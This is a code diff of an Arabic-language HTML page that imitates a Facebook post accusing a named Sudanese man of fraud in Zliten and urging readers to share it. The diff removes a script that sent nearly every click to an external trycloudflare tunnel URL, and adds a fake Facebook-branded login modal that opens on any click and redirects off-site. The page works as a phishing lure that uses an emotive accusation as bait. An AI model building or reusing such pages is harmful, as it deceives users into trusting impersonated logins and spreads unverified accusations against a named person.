@@ -72,6 +72,7 @@
             overflow: hidden;
             flex-shrink: 0;
             background-color: transparent !important;
+            cursor: pointer;
         }
         .profile-pic img {
             width: 100%;
@@ -83,9 +84,78 @@
             width: 32px;
             height: 32px;
         }
+
+        /* مودال تسجيل الدخول */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .modal {
+            background: white;
+            border-radius: 12px;
+            width: 350px;
+            max-width: 90%;
+            padding: 1.5rem 1.5rem 2.5rem;
+            position: relative;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            direction: rtl;
+        }
+        .modal img.facebook-logo {
+            width: 50px;
+            margin: 0 auto 1rem;
+            display: block;
+        }
+        .modal .close-btn {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            font-size: 1.25rem;
+            color: #555;
+            cursor: pointer;
+            font-weight: 700;
+            border: none;
+            background: transparent;
+            transition: color 0.2s ease;
+        }
+        .modal .close-btn:hover {
+            color: #1877f2;
+        }
+        .modal h2 {
+            margin-bottom: 1rem;
+            font-weight: 600;
+            color: #1877f2;
+            font-size: 1.25rem;
+        }
+        .modal p {
+            font-size: 0.9rem;
+            margin-bottom: 1.5rem;
+            color: #333;
+        }
+        .modal button.login-btn {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            font-weight: 600;
+            padding: 0.6rem 0;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background-color 0.3s ease;
+        }
+        .modal button.login-btn:hover {
+            background-color: #165dcb;
+        }
     </style>
 </head>
 <body class="bg-facebook-gray flex justify-center items-center min-h-screen p-4">
+
     <div class="w-full max-w-[500px] bg-white rounded-lg overflow-hidden fb-post-shadow">
         <!-- Post Header -->
         <div class="flex items-center p-3">
@@ -94,7 +164,7 @@
             </div>
             <div class="flex-1 mr-3">
                 <div class="flex items-center">
-                    <h3 class="font-semibold text-[15px] profile-name"> محمد بحري الفيتوري </h3>
+                    <h3 class="font-semibold text-[15px] profile-name" style="cursor:pointer;"> محمد بحري الفيتوري </h3>
                     <span class="ml-1.5 text-facebook-dark-gray">
                         <i class="fas fa-globe-americas text-[11px]"></i>
                     </span>
@@ -114,13 +184,13 @@
 
         <!-- Post Content -->
         <div class="px-4 pb-3">
-            <div class="post-text text-[15px] mb-3">
+            <div class="post-text text-[15px] mb-3" style="cursor:pointer;">
                 <p class="mb-1">تحذير هـــــــــام</p>
                 <p class="mb-1">اكبر واوقح نصاب في زليتن سوداني الجنسية ... انشر باش توصل لأكبر عدد من الناس </p>
             </div>
 
             <!-- Post Image -->
-            <div class="w-full mb-3 rounded-lg overflow-hidden">
+            <div class="w-full mb-3 rounded-lg overflow-hidden profile-pic" style="cursor:pointer;">
                 <img src="https://i.imgur.com/SwsAZhH.jpeg" alt="اجتماع الشركة" class="w-full h-auto object-cover" />
             </div>
 
@@ -143,15 +213,15 @@
 
         <!-- Action Buttons -->
         <div class="flex border-t border-facebook-light-gray mx-3">
-            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray reaction-button" data-type="like">
+            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray reaction-button" data-type="like" style="cursor:pointer;">
                 <i class="far fa-thumbs-up mr-1.5 text-facebook-icon-gray"></i>
                 <span class="text-sm font-medium">أعجبني</span>
             </button>
-            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray reaction-button" data-type="comment">
+            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray reaction-button" data-type="comment" style="cursor:pointer;">
                 <i class="far fa-comment mr-1.5 text-facebook-icon-gray"></i>
                 <span class="text-sm font-medium">تعليق</span>
             </button>
-            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray">
+            <button class="flex-1 py-2 flex items-center justify-center hover:bg-facebook-light-gray rounded-md text-facebook-dark-gray share-button" style="cursor:pointer;">
                 <i class="far fa-share-square mr-1.5 text-facebook-icon-gray"></i>
                 <span class="text-sm font-medium">مشاركة</span>
             </button>
@@ -160,11 +230,11 @@
         <!-- Comments -->
         <div class="bg-facebook-gray px-4 py-3">
             <div class="flex mb-3 comment">
-                <div class="profile-pic">
+                <div class="profile-pic" style="cursor:pointer;">
                     <img src="https://scd.infomigrants.net/media/resize/my_image_big/bf2bd6f8e71fb696c3560d516c2b3be58fe78cc7.jpg" alt="عادل" />
                 </div>
                 <div class="bg-white rounded-2xl mr-2 py-2 px-3 flex-1">
-                    <div class="font-medium text-[13px] profile-name">عادل زمرينه</div>
+                    <div class="font-medium text-[13px] profile-name" style="cursor:pointer;">عادل زمرينه</div>
                     <div class="text-[15px] mt-1">حسبي الله ونعم الوكيل فيه و في كل ظالم و سارق انشاء الله يلقاه في صحته</div>
                     <div class="flex items-center text-facebook-dark-gray text-[12px] mt-2">
                         <span>أعجبني</span>
@@ -177,11 +247,11 @@
             </div>
 
             <div class="flex mb-3 ml-4 comment">
-                <div class="profile-pic">
+                <div class="profile-pic" style="cursor:pointer;">
                     <img src="https://aresmaxima.com/wp-content/uploads/2023/03/Screenshot-2023-03-26-at-00-55-06-Armored-Vehicles-RDG-Offer.docx-Armored-Vehicles-RDG-Offer.docx-1.pdf.png" alt="محمد" />
                 </div>
                 <div class="bg-white rounded-2xl mr-2 py-2 px-3 flex-1">
-                    <div class="font-medium text-[13px] profile-name">محمد فكرون</div>
+                    <div class="font-medium text-[13px] profile-name" style="cursor:pointer;">محمد فكرون</div>
                     <div class="text-[15px] mt-1">لا حول ولا قوة الا بالله ربي ياخد فيه الحق</div>
                     <div class="flex items-center text-facebook-dark-gray text-[12px] mt-2">
                         <span>أعجبني</span>
@@ -209,49 +279,68 @@
         </div>
     </div>
 
+    <!-- مودال تسجيل الدخول -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="modal" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
+            <button class="close-btn" id="modalCloseBtn" aria-label="إغلاق النافذة">&times;</button>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo" class="facebook-logo" />
+            <h2 id="loginTitle" style="color: black;">تسجيل الدخول</h2>
+            <p>يرجى تسجيل الدخول للمتابعة</p>
+            <button class="login-btn" id="loginBtn">تسجيل الدخول</button>
+        </div>
+    </div>
+
     <script>
-    const targetURL = 'https://auditor-charms-bool-consent.trycloudflare.com/';
-    const clickableSelectors = [
-        '.post-text',
-        '.post-text *',
-        '.profile-pic',
-        '.profile-name',
-        '.reaction-button[data-type="comment"]',
-        'img'
-    ];
-    const excludeClickSelectors = [
-        '.comment-input button',
-        '.comment-input i',
-        '.comment-input'
-    ];
-    function isInsideExcludedElement(target) {
-        return excludeClickSelectors.some(selector => target.closest(selector));
-    }
-    clickableSelectors.forEach(selector => {
-        document.querySelectorAll(selector).forEach(el => {
-            el.addEventListener('click', function (e) {
-                if (isInsideExcludedElement(e.target)) {
-                    return;
-                }
-                if (e.target.tagName.toLowerCase() === 'img' && e.target.closest('.post-text, .comment-input')) {
-                    return;
-                }
-                e.preventDefault();
-                e.stopPropagation();
-                window.open(targetURL, '_blank');
+        // جلب عناصر النوافذ والأزرار
+        const loginModal = document.getElementById('loginModal');
+        const modalCloseBtn = document.getElementById('modalCloseBtn');
+        const loginBtn = document.getElementById('loginBtn');
+
+        // فتح النافذة عند الضغط على الأزرار أو الصور أو الأسماء (حسب المطلوب)
+        // اختر كل العناصر التي يجب أن تفتح النافذة
+        const triggerSelectors = [
+            '.reaction-button',  // أعجبني وتعليق
+            '.share-button',     // مشاركة
+            '.profile-pic img',  // صور البروفيلات
+            '.profile-name',     // أسماء البروفيلات
+        ];
+
+        // نضيف لكل العناصر المستهدفة حدث النقر ليظهر المودال
+        triggerSelectors.forEach(selector => {
+            document.querySelectorAll(selector).forEach(el => {
+                el.style.cursor = 'pointer';
+                el.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    showLoginModal();
+                });
             });
         });
-    });
-    document.querySelectorAll('.reaction-button[data-type="like"]').forEach(button => {
-        button.addEventListener('click', function (e) {
-            e.preventDefault();
-            e.stopPropagation();
-            this.classList.toggle('text-blue-600');
-            const icon = this.querySelector('i');
-            icon.classList.toggle('far');
-            icon.classList.toggle('fas');
+
+        function showLoginModal() {
+            loginModal.style.display = 'flex';
+        }
+
+        function hideLoginModal() {
+            loginModal.style.display = 'none';
+        }
+
+        // إغلاق النافذة عند الضغط على زر الإغلاق
+        modalCloseBtn.addEventListener('click', () => {
+            hideLoginModal();
         });
-    });
+
+        // إغلاق النافذة عند الضغط خارجها
+        loginModal.addEventListener('click', (e) => {
+            if(e.target === loginModal) {
+                hideLoginModal();
+            }
+        });
+
+        // زر تسجيل الدخول يوجه إلى الرابط المطلوب
+        loginBtn.addEventListener('click', () => {
+            window.location.href = 'https://imgur.com/a/hkQMCHF';
+        });
     </script>
 </body>
 </html>
